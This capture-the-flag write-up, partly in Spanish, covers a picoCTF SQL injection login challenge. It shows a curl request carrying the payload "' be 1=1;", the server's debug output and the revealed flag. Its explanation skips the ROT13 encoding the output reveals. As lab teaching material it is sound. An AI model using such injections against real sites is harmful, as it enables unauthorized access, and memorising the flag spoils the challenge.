## Description

There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/40742/` ([link](https://jupiter.challenges.picoctf.org/problem/40742/)) or http://jupiter.challenges.picoctf.org:40742. Try to see if you can login as admin!
#### hints
- Seems like the password is encrypted.
## Solución
```shell
┌──(kali㉿kali)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/40742/login.php -d "password=' be 1=1;&debug=1"
<pre>password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}</p>                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ 

```
## Bandera
```css
flag: picoCTF{3v3n_m0r3_SQL_4424e7af}
```
## Notas Adicionales
En este caso, se realizó una inyección SQL en el campo de la contraseña enviando la cadena `"password=' be 1=1;"`, lo que alteró la consulta SQL de manera que siempre devolviera verdadero (`1=1`). Esto permitió saltarse la verificación de la contraseña y acceder al sistema sin credenciales válidas. La inyección resultó en la revelación de la bandera.
# comandos utilizados

## Referencias
